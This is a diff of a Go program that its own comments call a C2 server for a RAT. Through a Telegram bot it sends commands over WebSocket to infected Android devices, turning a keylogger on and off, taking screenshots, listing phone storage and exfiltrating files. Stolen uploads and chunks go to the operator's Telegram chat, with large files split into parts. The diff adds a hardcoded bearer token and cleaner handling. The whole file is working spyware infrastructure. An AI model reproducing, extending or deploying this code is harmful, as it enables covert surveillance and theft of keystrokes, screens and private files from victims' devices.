@@ -27,14 +27,14 @@ import (
 var (
 	token     = os.Getenv("TELEGRAM_TOKEN")
 	chatIDStr = os.Getenv("CHAT_ID")
-	clients   = make(map[*websocket.Conn]string) // conn -> device_name
+	clients   = make(map[*websocket.Conn]string)
 	deviceMu  sync.RWMutex
 	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
 )
 
 var chatID int64
-
-const maxPartSize = 50 * 1024 * 1024 // 50MB per Telegram document
+const maxPartSize = 50 * 1024 * 1024 // Telegram limit
+const authToken   = "Bearer 1234"     // RAT's auth
 
 func main() {
 	var err error
@@ -49,15 +49,15 @@ func main() {
 	go startBot(ctx)
 
 	http.HandleFunc("/", rootHandler)
-	http.HandleFunc("/upload", uploadHandler)
-	http.HandleFunc("/upload_chunked", chunkedHandler)
+	http.HandleFunc("/upload", uploadHandler)     // Screenshots/small files
+	http.HandleFunc("/upload_chunked", chunkedHandler) // Chunked/resumable
 	http.HandleFunc("/ws", wsHandler)
 
 	port := os.Getenv("PORT")
 	if port == "" {
 		port = "10000"
 	}
-	log.Printf("C2 live → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
+	log.Printf("C2 → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
 	log.Fatal(http.ListenAndServe(":"+port, nil))
 }
 
@@ -71,140 +71,183 @@ func startBot(ctx context.Context) {
 		if update.Message == nil || update.Message.Chat.ID != chatID {
 			return
 		}
-		msg := strings.TrimSpace(strings.ToLower(update.Message.Text))
-		parts := strings.Fields(msg)
-		if len(parts) == 0 {
-			return
-		}
+		text := strings.ToLower(strings.TrimSpace(update.Message.Text))
+		parts := strings.Fields(text)
+		if len(parts) == 0 { return }
 		cmd := parts[0]
-		args := strings.Join(parts[1:], " ")
+		arg := strings.Join(parts[1:], " ")
 
 		switch cmd {
 		case "/start":
 			listDevices(b, ctx)
-
 		case "/on":
 			broadcastJSON(map[string]any{"command": "ON"})
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger ENABLED on all devices"})
-
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger ON"})
 		case "/off":
 			broadcastJSON(map[string]any{"command": "OFF"})
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger DISABLED on all devices"})
-
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger OFF"})
 		case "/screenshot":
 			broadcastJSON(map[string]any{"command": "screenshot"})
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent"})
-
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot requested"})
 		case "/ls", "/dir":
 			path := "/storage/emulated/0"
-			if args != "" {
-				path = args
-			}
+			if arg != "" { path = arg }
 			reqID := genID()
 			broadcastJSON(map[string]any{
-				"command":     "file_list",
-				"path":        path,
-				"request_id":  reqID,
+				"command": "file_list",
+				"path":    path,
+				"request_id": reqID,
 			})
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Listing: %s", path)})
-
-		case "/download", "/get":
-			path := args
-			if path == "" {
-				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /download /path/to/file"})
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Listing: %s (ID: %s)", path, reqID)})
+		case "/download", "/get", "/send_file":
+			if arg == "" {
+				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /download <path>"})
 				return
 			}
 			broadcastJSON(map[string]any{
 				"command":   "send_file",
-				"file_path": path,
+				"file_path": arg,
 			})
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Downloading: %s", path)})
-
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Downloading: %s", arg)})
 		case "/help":
-			help := `Available commands:
-/start - Show devices
-/on - Enable keylogger
-/off - Disable keylogger
-/screenshot - Take screenshot
-/ls [path] - List directory
-/download <path> - Download file
-/help - This menu`
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: help})
-
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: `/start - Devices
+/on /off - Keylogger toggle
+/screenshot - Capture screen
+/ls <path> - List directory
+/download <path> - Exfil file
+/help - Commands`})
 		default:
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown command. Type /help"})
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown. /help for list."})
 		}
 	})
-
 	b.Start(ctx)
 }
 
 func listDevices(b *bot.Bot, ctx context.Context) {
 	deviceMu.RLock()
+	defer deviceMu.RUnlock()
 	if len(clients) == 0 {
-		b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "No devices connected"})
-		deviceMu.RUnlock()
+		b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "No devices connected."})
 		return
 	}
-	var names []string
+	var list []string
 	for _, name := range clients {
-		names = append(names, name)
+		list = append(list, "• "+name)
 	}
-	deviceMu.RUnlock()
-	b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Connected devices (%d):\n• %s", len(names), strings.Join(names, "\n• "))})
+	b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Devices (%d):\n%s", len(clients), strings.Join(list, "\n"))})
 }
 
 func broadcastJSON(data map[string]any) {
 	payload, _ := json.Marshal(data)
 	deviceMu.RLock()
 	defer deviceMu.RUnlock()
-	log.Printf("Broadcasting JSON → %s", string(payload))
+	log.Printf("→ %s", string(payload))
 	for conn := range clients {
 		if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
-			log.Printf("WS write error: %v", err)
+			log.Printf("WS error: %v", err)
 			delete(clients, conn)
 		}
 	}
 }
 
 func rootHandler(w http.ResponseWriter, r *http.Request) {
-	json.NewEncoder(w).Encode(map[string]any{
-		"status":            "running",
-		"connected_devices": len(clients),
-	})
+	json.NewEncoder(w).Encode(map[string]any{"status": "running", "devices": len(clients)})
 }
 
 func uploadHandler(w http.ResponseWriter, r *http.Request) {
-	r.ParseMultipartForm(50 << 20)
+	if r.Header.Get("Authorization") != authToken {
+		http.Error(w, `{"status":"error","message":"unauthorized"}`, http.StatusUnauthorized)
+		return
+	}
+	if r.Method != "POST" {
+		http.Error(w, "POST only", http.StatusMethodNotAllowed)
+		return
+	}
 	file, header, err := r.FormFile("file")
 	if err != nil {
-		http.Error(w, "No file", 400)
+		log.Printf("Upload error: %v", err)
+		http.Error(w, `{"status":"error","message":"no file"}`, http.StatusBadRequest)
 		return
 	}
 	defer file.Close()
-	data, _ := io.ReadAll(file)
-	sendFileToTelegram(header.Filename, data, fmt.Sprintf("File: %s (%d KB)", header.Filename, len(data)/1024))
-	w.Write([]byte("OK"))
+	data, err := io.ReadAll(file)
+	if err != nil {
+		log.Printf("Read error: %v", err)
+		http.Error(w, `{"status":"error","message":"read fail"}`, http.StatusInternalServerError)
+		return
+	}
+	caption := fmt.Sprintf("Uploaded: %s (%d KB)", header.Filename, len(data)/1024)
+	sendFileToTelegram(header.Filename, data, caption)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "saved_offset": 0})
 }
 
 func chunkedHandler(w http.ResponseWriter, r *http.Request) {
-	defer r.Body.Close()
-	data, _ := io.ReadAll(r.Body)
-	if len(data) < 100 {
-		sendMsg(fmt.Sprintf("Data received: %d bytes\nPreview: %s", len(data), string(data)))
-	} else {
-		sendFileToTelegram("chunked_data.bin", data, fmt.Sprintf("Chunked data: %d KB", len(data)/1024))
+	if r.Header.Get("Authorization") != authToken {
+		http.Error(w, `{"status":"error","message":"unauthorized"}`, http.StatusUnauthorized)
+		return
 	}
-	w.Write([]byte("OK"))
+	if r.Method != "POST" {
+		http.Error(w, "POST only", http.StatusMethodNotAllowed)
+		return
+	}
+	chunkFile, header, err := r.FormFile("file_chunk")
+	if err != nil {
+		// Fallback to raw body for non-multipart
+		defer r.Body.Close()
+		bodyData, _ := io.ReadAll(r.Body)
+		caption := fmt.Sprintf("Chunked data: %d bytes", len(bodyData))
+		sendFileToTelegram("data.bin", bodyData, caption)
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]any{"status": "ok", "saved_offset": 0})
+		return
+	}
+	defer chunkFile.Close()
+	chunkData, err := io.ReadAll(chunkFile)
+	if err != nil {
+		log.Printf("Chunk read error: %v", err)
+		http.Error(w, `{"status":"error","message":"read fail"}`, http.StatusInternalServerError)
+		return
+	}
+	offsetStr := r.FormValue("offset")
+	totalStr := r.FormValue("total_size")
+	chunkIndexStr := r.FormValue("chunk_index")
+	requestID := r.FormValue("request_id")
+	filename := header.Filename
+	if filename == "" {
+		filename = "chunk_" + chunkIndexStr
+	}
+	offset, _ := strconv.ParseInt(offsetStr, 10, 64)
+	total, _ := strconv.ParseInt(totalStr, 10, 64)
+	caption := fmt.Sprintf("Chunk %s: %s (%d/%d bytes, offset %d)", chunkIndexStr, filename, offset+int64(len(chunkData)), total, offset)
+	sendFileToTelegram(filename, chunkData, caption)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]any{
+		"status":       "ok",
+		"saved_offset": offset + int64(len(chunkData)),
+		"request_id":   requestID,
+	})
 }
 
 func wsHandler(w http.ResponseWriter, r *http.Request) {
-	conn, _ := upgrader.Upgrade(w, r, nil)
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Printf("WS upgrade failed: %v", err)
+		return
+	}
 	defer conn.Close()
 
-	// Wait for device name
-	_, msg, _ := conn.ReadMessage()
-	deviceName := strings.TrimSpace(string(msg))
+	// RAT sends device name first
+	_, msg, err := conn.ReadMessage()
+	if err != nil {
+		log.Printf("No device name: %v", err)
+		return
+	}
+	device := strings.TrimSpace(string(msg))
+	if !strings.HasPrefix(device, "device:") {
+		device = "device: " + device
+	}
+	deviceName := strings.TrimPrefix(device, "device: ")
 	if deviceName == "" {
 		deviceName = "Unknown Device"
 	}
@@ -224,29 +267,35 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 	for {
 		_, msg, err := conn.ReadMessage()
 		if err != nil {
+			log.Printf("WS read error: %v", err)
 			break
 		}
 		text := string(msg)
 		log.Printf("RAT → %s: %s", deviceName, text)
-		sendMsg(fmt.Sprintf("[%s]\n%s", deviceName, text))
+		if strings.Contains(text, "file_list_response") || strings.Contains(text, "ls:") {
+			// Format directory listings nicely
+			sendMsg(fmt.Sprintf("📁 [%s]\n%s", deviceName, text))
+		} else if strings.Contains(text, "complete") {
+			sendMsg(fmt.Sprintf("✅ [%s] %s", deviceName, text))
+		} else {
+			sendMsg(fmt.Sprintf("[%s]\n%s", deviceName, text))
+		}
 	}
 }
 
 func sendFileToTelegram(filename string, data []byte, caption string) {
 	b, _ := bot.New(token)
-
+	if len(data) == 0 {
+		return
+	}
 	if len(data) <= maxPartSize {
-		_, err := b.SendDocument(context.Background(), &bot.SendDocumentParams{
+		b.SendDocument(context.Background(), &bot.SendDocumentParams{
 			ChatID:   chatID,
 			Document: &models.InputFileUpload{Filename: filename, Data: bytes.NewReader(data)},
 			Caption:  caption,
 		})
-		if err != nil {
-			log.Printf("Telegram send failed: %v", err)
-		}
 		return
 	}
-
 	// Split large files
 	numParts := int(math.Ceil(float64(len(data)) / float64(maxPartSize)))
 	for i := 0; i < numParts; i++ {
@@ -255,24 +304,20 @@ func sendFileToTelegram(filename string, data []byte, caption string) {
 		if end > len(data) {
 			end = len(data)
 		}
-		part := data[start:end]
+		partData := data[start:end]
 		partName := fmt.Sprintf("%s.part%d", filename, i+1)
-
 		b.SendDocument(context.Background(), &bot.SendDocumentParams{
 			ChatID:   chatID,
-			Document: &models.InputFileUpload{Filename: partName, Data: bytes.NewReader(part)},
-			Caption:  fmt.Sprintf("%s\nPart %d/%d", caption, i+1, numParts),
+			Document: &models.InputFileUpload{Filename: partName, Data: bytes.NewReader(partData)},
+			Caption:  fmt.Sprintf("%s\nPart %d/%d (%d KB)", caption, i+1, numParts, len(partData)/1024),
 		})
-		time.Sleep(200 * time.Millisecond)
+		time.Sleep(200 * time.Millisecond) // Rate limit
 	}
 }
 
 func sendMsg(text string) {
 	b, _ := bot.New(token)
-	b.SendMessage(context.Background(), &bot.SendMessageParams{
-		ChatID: chatID,
-		Text:   text,
-	})
+	b.SendMessage(context.Background(), &bot.SendMessageParams{ChatID: chatID, Text: text})
 }
 
 func genID() string {
